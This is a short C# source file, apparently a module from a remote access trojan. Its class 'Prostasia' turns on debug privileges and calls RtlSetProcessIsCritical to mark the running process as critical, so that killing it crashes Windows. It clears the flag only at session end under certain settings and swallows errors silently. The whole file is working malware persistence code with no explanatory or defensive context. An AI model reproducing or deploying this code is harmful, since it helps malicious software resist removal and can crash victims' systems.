using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace Peg.ICARUS
{
	public static class Prostasia
	{
		public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
		{
			if (Convert.ToBoolean(Settings.ODBS) && Me8odos.IsAdmin())
			{
				Exit();
			}
		}

		public static void Set()
		{
			try
			{
				SystemEvents.SessionEnding += SystemEvents_SessionEnding;
				Process.EnterDebugMode();
				Askhshs.RtlSetProcessIsCritical(1u, 0u, 0u);
			}
			catch
			{
			}
		}

		public static void Exit()
		{
			try
			{
				Askhshs.RtlSetProcessIsCritical(0u, 0u, 0u);
			}
			catch
			{
				while (true)
				{
					Thread.Sleep(100000);
				}
			}
		}
	}
}
